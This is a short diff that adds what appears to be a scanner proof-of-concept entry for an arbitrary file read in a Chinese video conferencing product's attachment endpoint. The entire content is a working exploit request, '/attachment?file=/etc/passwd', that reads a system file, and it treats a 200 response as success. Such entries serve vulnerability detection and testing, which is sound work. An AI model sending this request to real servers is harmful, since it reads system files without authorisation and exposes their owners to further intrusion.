@@ -1,0 +1,3 @@
+name: "佳会视频会议attachment任意文件读取"
+poc: "/attachment?file=/etc/passwd"
+status_code: 200
